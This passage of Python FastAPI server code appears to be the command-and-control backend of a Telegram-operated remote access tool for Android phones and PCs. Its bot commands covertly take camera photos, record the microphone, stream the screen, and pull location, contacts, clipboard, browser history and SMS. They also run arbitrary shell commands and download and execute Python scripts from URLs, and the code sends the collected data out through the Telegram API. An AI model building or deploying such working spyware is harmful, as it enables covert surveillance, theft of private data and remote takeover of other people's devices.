        await send_tg(chat_id, "📥 Отправлено на скачивание. После завершения появится в /lists.")

    elif text == "/lists":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            await enqueue_multi(chat_id,
                {"cmd": "get_video_list"}, "список видео")
            await send_tg(chat_id, "⏳ Запрашиваю список видео с ПК...")

    elif text.startswith("/raw "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /raw 1")
            return
        num = int(parts[1])
        await start_video_flow(chat_id, "play_raw", raw_num=num)

    elif text.startswith("/delvideo "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /delvideo 1")
            return
        num = int(parts[1])
        await enqueue_multi(chat_id,
            {"cmd": "delete_video", "num": num}, f"удалить видео raw{num}")
        await send_tg(chat_id, f"🗑 Удаляю raw{num} с ПК...")

    elif text == "/unbanvideo":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "unban_video"}, "разблок видео")

    elif text.startswith("/name "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            name = text[6:].strip().lower()
            if name not in VALID_NAMES:
                await send_tg(chat_id, f"⚠️ Имена: {', '.join(VALID_NAMES)}")
                return
            await enqueue_multi(chat_id, {"cmd": "rename", "name": name}, f"rename {name}")

    # ── Опросник ─────────────────────────────────────────────────────────────
    elif text.startswith("/addq "):
        q = text[6:].strip()
        if not q:
            await send_tg(chat_id, "⚠️ /addq Как дела?")
            return
        state["questions"].append(q)
        await send_tg(chat_id,
            f"✅ Вопрос *{len(state['questions'])}* добавлен:\n_{q}_")

    elif text.startswith("/delq "):
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /delq 1")
            return
        num = int(parts[1])
        if num < 1 or num > len(state["questions"]):
            await send_tg(chat_id, f"⚠️ Нет вопроса {num}.")
            return
        removed = state["questions"].pop(num - 1)
        await send_tg(chat_id, f"🗑 Удалён вопрос {num}: _{removed}_")

    elif text == "/questions":
        if not state["questions"]:
            await send_tg(chat_id, "📭 Вопросов нет. /addq <вопрос>")
            return
        lines = ["📋 *Список вопросов опросника:*\n"]
        for i, q in enumerate(state["questions"], 1):
            lines.append(f"{i}. {q}")
        await send_tg(chat_id, "\n".join(lines))

    # ── Файлы ────────────────────────────────────────────────────────────────
    elif text == "/getfiles":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "open_gallery"}, "открыть галерею")

    elif text == "/camera":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "open_camera"}, "открыть камеру")

    elif text == "/stream_start":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "stream_start"}, "запуск стриминга экрана")

    elif text == "/stream_stop":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "stream_stop"}, "остановка стриминга")

    elif text.startswith("/history"):
        parts = text.split()
        days = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 7
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "browser_history", "days": days}, f"история браузеров ({days} дн.)")

    elif text == "/location":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "get_location"}, "геолокация")

    elif text == "/contacts":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "get_contacts"}, "контакты")

    elif text == "/apps":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "get_apps"}, "список приложений")

    elif text == "/clipboard":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "get_clipboard"}, "буфер обмена")

    elif text.startswith("/brightness "):
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit() or not (0 <= int(parts[1]) <= 100):
            await send_tg(chat_id, "⚠️ /brightness 0-100")
        else:
            dev_id, err = require_device(chat_id)
            if err: await send_tg(chat_id, err)
            else: await enqueue_multi(chat_id, {"cmd": "set_brightness", "level": int(parts[1])}, f"яркость {parts[1]}%")

    elif text == "/vibrate":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "vibrate", "ms": 1000}, "вибрация")

    elif text in ("/flashon", "/flashoff"):
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else: await enqueue_multi(chat_id, {"cmd": "flashlight", "on": text == "/flashon"}, "фонарик")

    elif text in ("/photo", "/photof"):
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else:
            cam = "front" if text == "/photof" else "back"
            await enqueue_multi(chat_id, {"cmd": "take_photo", "camera": cam}, f"фото ({cam})")

    elif text == "/micro":
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            state["micro_sessions"][chat_id] = {"step": "waiting_devices", "dev_id": dev_id}
            await enqueue_command(chat_id, dev_id,
                {"cmd": "get_audio_devices"},
                "запрос списка микрофонов")
            await send_tg(chat_id, "⏳ Запрашиваю список микрофонов...")

    elif text.startswith("/cmd "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
        else:
            command = text[5:].strip()
            if not command:
                await send_tg(chat_id, "⚠️ Укажи команду: /cmd dir")
                return
            await enqueue_multi(chat_id, {"cmd": "run_cmd", "command": command}, f"cmd: {command[:30]}")

    elif text == "/listpy":
        dev_id, err = require_device(chat_id)
        if err: await send_tg(chat_id, err)
        else:
            await enqueue_multi(chat_id, {"cmd": "get_py_list"}, "список скриптов")
            await send_tg(chat_id, "⏳ Запрашиваю список скриптов...")

    elif text.startswith("/addpy "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        url = text[7:].strip()
        if not url.startswith("http"):
            await send_tg(chat_id, "⚠️ Укажи ссылку: /addpy https://...")
            return
        await enqueue_multi(chat_id, {"cmd": "fetch_py", "url": url}, "скачать скрипт")
        await send_tg(chat_id, "📥 Скачиваю скрипт...")

    elif text.startswith("/runpy "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /runpy 1")
            return
        await enqueue_multi(chat_id, {"cmd": "run_py", "num": int(parts[1])}, f"запуск скрипта py{parts[1]}")

    elif text.startswith("/delpy "):
        dev_id, err = require_device(chat_id)
        if err:
            await send_tg(chat_id, err)
            return
        parts = text.split()
        if len(parts) != 2 or not parts[1].isdigit():
            await send_tg(chat_id, "⚠️ /delpy 1")
            return
        await enqueue_multi(chat_id, {"cmd": "del_py", "num": int(parts[1])}, f"удалить py{parts[1]}")

    else:
        await send_tg(chat_id, "❓ /help", reply_markup=main_keyboard())


# ─── Webhook ──────────────────────────────────────────────────────────────────

@app.post("/webhook")
async def webhook(update: dict):
    asyncio.create_task(process_update(update))
    return {"ok": True}


# ─── Upload endpoint (Android → TG proxy) ────────────────────────────────────

@app.post("/upload")
async def upload(
    file: UploadFile = File(...),
    x_device_secret: Optional[str] = Header(None),
    x_device_id: Optional[str] = Header(None),
    x_chat_id: Optional[str] = Header(None),
    x_caption: Optional[str] = Header(None),
    x_code_upload: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    dev_id  = x_device_id or "default"
    chat_id = x_chat_id or ALLOWED_CHAT_ID
    if not chat_id:
        raise HTTPException(status_code=400, detail="No chat_id")

    data     = await file.read()
    filename = file.filename or "file"
    caption  = urllib.parse.unquote(x_caption) if x_caption else f"Файл: {filename}"

    if x_code_upload == "true":
        # Отправляем боту с кнопками подтверждения
        asyncio.create_task(send_tg_file(
            chat_id, data, filename,
            f"📸 *Запрос на разблокировку*\nУстройство: `{dev_id}`\nФайл: {filename}\n\nПодтвердить разблокировку?",
            reply_markup=code_confirm_keyboard(dev_id, chat_id)
        ))
    else:
        asyncio.create_task(send_tg_file(chat_id, data, filename, caption))

    return {"ok": True, "size": len(data)}


# ─── Video list endpoint ─────────────────────────────────────────────────────

@app.post("/video_list")
async def video_list_endpoint(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    videos = body.get("videos", [])

    if not videos:
        await send_tg(chat_id, "📭 На ПК нет скачанных видео. Добавь через /addraw <url>")
        return {"ok": True}

    lines = ["📋 Видео на телефоне:\n"]
    for v in videos:
        lines.append(f"{v['name']} - {v['filename']} ({v['size_mb']} MB)")
    lines.append("\n/raw <номер> - воспроизвести")
    lines.append("/delvideo <номер> - удалить")
    # Отправляем без Markdown чтобы символы в именах файлов не ломали парсер
    payload = {"chat_id": chat_id, "text": "\n".join(lines)}
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            r = await client.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload)
            print(f"send_tg video_list -> {r.status_code}")
    except Exception as e:
        print(f"video_list send error: {e}")
    return {"ok": True}


# ─── Micro devices endpoint ──────────────────────────────────────────────────

@app.post("/micro_devices")
async def micro_devices(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    devices_list = body.get("devices", [])

    if not chat_id or not devices_list:
        return {"ok": False}

    sess = state["micro_sessions"].get(chat_id, {})
    sess["step"] = "choose_device"
    sess["dev_id"] = body.get("device_id", "")
    sess["devices_list"] = devices_list
    state["micro_sessions"][chat_id] = sess

    rows = []
    for d in devices_list:
        rows.append([{"text": f"🎙 {d['name'][:40]}", "callback_data": f"micro_dev:{d['index']}"}])
    rows.append([{"text": "❌ Отмена", "callback_data": "micro_cancel"}])

    await send_tg(chat_id, "🎙 Выбери микрофон:", reply_markup={"inline_keyboard": rows})
    return {"ok": True}


# ─── Text reply endpoint ──────────────────────────────────────────────────────

@app.post("/text_reply")
async def text_reply(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    text    = body.get("text", "")
    dev_id  = body.get("device_id", "?")
    model   = devices.get(dev_id, {}).get("model", dev_id)
    if chat_id and text:
        payload = {"chat_id": chat_id, "text": f"📱 {model}:\n{text}"}
        try:
            async with httpx.AsyncClient(timeout=10) as client:
                await client.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json=payload
                )
        except Exception as e:
            print(f"text_reply send error: {e}")
    return {"ok": True}


# ─── Poll ─────────────────────────────────────────────────────────────────────

@app.get("/poll")
async def poll(
    x_device_secret: Optional[str] = Header(None),
    x_device_id:     Optional[str] = Header(None),
    x_device_model:    Optional[str] = Header(None),
    x_device_platform: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        print(f"403: got='{x_device_secret}' expected='{DEVICE_SECRET}'")
        raise HTTPException(status_code=403, detail="Forbidden")

    dev_id = x_device_id or "default"
    d = get_device(dev_id)
    d["last_seen"] = datetime.now()
    if x_device_model:
        d["model"] = x_device_model
    if x_device_platform:
        d["platform"] = x_device_platform

    if d["pending_commands"]:
        cmd    = d["pending_commands"].pop(0)
        cmd_id = cmd.get("_id")
        if cmd_id and cmd_id in d["command_callbacks"]:
            cid = d["command_callbacks"].pop(cmd_id)
            cmd["_chat_id"] = cid
            asyncio.create_task(
                send_tg(cid, f"📲 Телефон получил команду {cmd.get('cmd')}."))
        if cmd.get("cmd") == "ban":
            d["pending_commands"] = [
                c for c in d["pending_commands"] if c.get("cmd") != "ban"
            ]
        return {"active": d["active"], "command": cmd, "instance_id": INSTANCE_ID}

    return {"active": d["active"], "command": None, "instance_id": INSTANCE_ID}


# ─── Health ───────────────────────────────────────────────────────────────────

@app.get("/health")
async def health():
    return {"status": "ok", "devices": len(devices)}


# ─── Восстановление состояния после рестарта ─────────────────────────────────

@app.post("/restore_state")
async def restore_state(
    x_device_secret: Optional[str] = Header(None),
    body: dict = None,
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    if not body:
        return {"ok": False}

    restored = []

    raw_links = body.get("raw_links", [])
    if raw_links:
        state["raw_links"] = raw_links
        restored.append(f"raw_links: {len(raw_links)}")

    questions = body.get("questions", [])
    if questions:
        state["questions"] = questions
        restored.append(f"questions: {len(questions)}")

    if restored:
        await send_tg(ALLOWED_CHAT_ID, f"♻️ Состояние восстановлено после рестарта:\n" + "\n".join(restored))

    return {"ok": True, "restored": restored}


@app.get("/get_state")
async def get_state(x_device_secret: Optional[str] = Header(None)):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    return {
        "raw_links": state["raw_links"],
        "questions": state["questions"],
        "instance_id": INSTANCE_ID,
    }


# ─── SMS endpoint ─────────────────────────────────────────────────────────────

@app.post("/sms")
async def receive_sms(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    sender  = body.get("sender", "Неизвестно")
    text    = body.get("body", "")
    dev_id  = body.get("device_id", "?")
    model   = devices.get(dev_id, {}).get("model", dev_id)
    if chat_id and text:
        await send_tg(chat_id, f"📩 *SMS* — `{sender}`\n_{model}_\n\n{text}")
    return {"ok": True}


# ─── Py list endpoint ─────────────────────────────────────────────────────────

@app.post("/py_list")
async def py_list_endpoint(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    scripts = body.get("scripts", [])
    if not scripts:
        await send_tg(chat_id, "📭 Нет скриптов. Добавь через /addpy <url>")
        return {"ok": True}
    lines = ["📋 *Python скрипты на ПК:*\n"]
    for s in scripts:
        lines.append(f"`{s['name']}` — {s['filename']}")
    lines.append("\n▶️ /runpy <номер> — запустить")
    lines.append("🗑 /delpy <номер> — удалить")
    await send_tg(chat_id, "\n".join(lines))
    return {"ok": True}


# ─── Cmd output endpoint ──────────────────────────────────────────────────────

@app.post("/cmd_output")
async def cmd_output(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    output  = body.get("output", "")
    command = body.get("command", "")
    dev_id  = body.get("device_id", "?")
    model   = devices.get(dev_id, {}).get("model", dev_id)
    if chat_id:
        text = output[:3800] if len(output) > 3800 else output
        suffix = "\n\n_...вывод обрезан_" if len(output) > 3800 else ""
        await send_tg(chat_id,
            f"💻 *{model}* — `{command}`\n\n```\n{text}\n```{suffix}")
    return {"ok": True}


# ─── Temp video download (ПК скачивает файл, потом удаляем) ──────────────────

@app.get("/tmp_video/{token}")
async def tmp_video(token: str, x_device_secret: Optional[str] = Header(None)):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    import pathlib
    path = _temp_uploads.get(token)
    if not path or not pathlib.Path(path).exists():
        raise HTTPException(status_code=404, detail="Not found")

    data = pathlib.Path(path).read_bytes()
    filename = pathlib.Path(path).name.split("_", 1)[-1]  # убираем token_ префикс

    # Удаляем после отдачи
    try:
        pathlib.Path(path).unlink()
        _temp_uploads.pop(token, None)
    except Exception:
        pass

    from fastapi.responses import Response as FResponse
    return FResponse(
        content=data,
        media_type="video/mp4",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'}
    )


# ─── Audio upload (Android записал микрофон, шлёт файл) ──────────────────────

@app.post("/audio_upload")
async def audio_upload(
    request: Request,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")

    form = await request.form()
    chat_id  = form.get("chat_id", ALLOWED_CHAT_ID)
    dev_id   = form.get("device_id", "?")
    audio    = form.get("audio")

    if not audio or not chat_id:
        raise HTTPException(status_code=400, detail="Missing fields")

    data = await audio.read()
    model = devices.get(dev_id, {}).get("model", dev_id)

    await send_tg_file(chat_id, data, audio.filename or "record.m4a",
                       caption=f"🎙 *{model}* — запись микрофона")
    return {"ok": True}
